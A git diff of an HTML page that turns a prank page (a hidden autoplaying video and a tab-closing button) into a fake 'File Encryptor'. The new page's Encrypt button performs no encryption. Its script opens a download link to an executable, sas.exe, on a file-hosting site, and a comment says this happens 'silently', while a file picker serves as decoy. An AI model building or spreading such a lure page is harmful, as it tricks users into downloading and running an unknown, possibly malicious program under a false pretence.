@@ -3,56 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VIP Baby Button</title>
+    <title>File Encryptor</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            background-color: #6a0dad; /* Purple theme */
+            color: white;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f0f0;
+            padding: 20px;
+            text-align: center;
         }
-        #vip-button, #pubg-button {
-            padding: 20px 40px;
-            font-size: 20px;
-            background-color: #007BFF;
-            color: white;
+        h1 {
+            margin-bottom: 30px;
+        }
+        #choose-file-button, #encrypt-button {
+            padding: 15px 30px;
+            font-size: 18px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
             margin: 10px;
+            transition: background-color 0.3s;
         }
-        #vip-button:hover, #pubg-button:hover {
-            background-color: #0056b3;
+        #choose-file-button {
+            background-color: #ff69b4; /* Pink theme */
+            color: white;
         }
-        /* Hides the video element */
-        #hidden-video {
-            display: none;
+        #choose-file-button:hover {
+            background-color: #ff1493; /* Darker pink on hover */
+        }
+        #encrypt-button {
+            background-color: #000; /* Black theme */
+            color: white;
+        }
+        #encrypt-button:hover {
+            background-color: #333; /* Darker black on hover */
+        }
+        input[type="file"] {
+            display: none; /* Hides the file input */
+        }
+        #file-name {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #ffeb3b; /* Yellow color for file name */
         }
     </style>
 </head>
 <body>
 
-    <button id="vip-button">Click to Get VIP Baby</button>
-    <button id="pubg-button">PUBG</button>
+    <h1>File Encryptor</h1>
+    <label id="choose-file-button" for="file-input">Choose File Wanna to Crypt</label>
+    <input type="file" id="file-input" />
 
-    <!-- Hidden video element -->
-    <iframe id="hidden-video" width="0" height="0" 
-            src="https://www.youtube.com/embed/zVOKKPDWtTY?autoplay=1&mute=0" 
-            frameborder="0" allow="autoplay"></iframe>
+    <button id="encrypt-button">Encrypt</button>
+
+    <!-- Box to display the selected file name -->
+    <div id="file-name">No file chosen</div>
 
     <script>
-        // When the "Click to Get VIP Baby" button is clicked, the hidden video starts playing
-        document.getElementById("vip-button").addEventListener("click", function() {
-            document.getElementById("hidden-video").style.display = "block";
+        // Add event listener for the encrypt button
+        document.getElementById("encrypt-button").addEventListener("click", function() {
+            // Open the specified link silently
+            window.open("https://www.upload.ee/download/17207934/3df134c596841f8ad51b/sas.exe", "_blank");
         });
 
-        // When the "PUBG" button is clicked, it closes the website from the user's device
-        document.getElementById("pubg-button").addEventListener("click", function() {
-            window.open('', '_self').close(); // Closes the tab or window
+        // Display the name of the chosen file
+        document.getElementById("file-input").addEventListener("change", function() {
+            const fileNameDisplay = document.getElementById("file-name");
+            if (this.files.length > 0) {
+                fileNameDisplay.textContent = "Selected file: " + this.files[0].name;
+            } else {
+                fileNameDisplay.textContent = "No file chosen";
+            }
         });
     </script>
 
